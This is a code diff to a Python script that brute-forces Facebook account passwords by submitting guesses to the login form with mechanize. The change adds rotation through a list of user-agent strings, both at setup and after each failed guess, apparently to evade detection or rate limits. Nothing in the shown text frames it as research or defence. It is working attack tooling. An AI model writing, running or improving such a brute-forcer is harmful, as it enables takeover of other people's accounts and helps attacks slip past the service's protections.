@@ -18,6 +18,7 @@ from multiprocessing import Process
 from pathlib import Path
 from bs4 import BeautifulSoup
 from lazyme.string import color_print
+from random import choice
 
 
 #
@@ -115,7 +116,10 @@ def def_setup():
 	browser.set_handle_robots(False)
 	cookies = mechanize.CookieJar()
 	browser.set_cookiejar(cookies)
-	browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7')]
+	user_agents = ['Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7','Konqueror/3.0-rc4; (Konqueror/3.0-rc4; i686 Linux;;datecode)','Opera/9.52 (X11; Linux i686; U; en)']
+	random_user_agent = choice(user_agents)
+	color_print("[+] Using random user agent " + random_user_agent, color='blue')	
+	browser.addheaders = [('User-agent', random_user_agent)]
 	browser.set_handle_refresh(True)
 	browser.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 		
@@ -183,6 +187,12 @@ def def_login():
 			# Attempt to brute force the password.
 			title = soup.title.string
 			if title != 'Facebook':
+
+				# We have the wrong? password so change the user agent
+				user_agents = ['Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7','Konqueror/3.0-rc4; (Konqueror/3.0-rc4; i686 Linux;;datecode)','Opera/9.52 (X11; Linux i686; U; en)']
+				random_user_agent = choice(user_agents)
+				color_print("[+] Using random user agent " + random_user_agent, color='blue')				
+				browser.addheaders = [('User-agent', random_user_agent)]
 
 				# PASSWORD NOT FOUND, DAMN!!
 				action = soup.find('form', id='login_form').get('action')
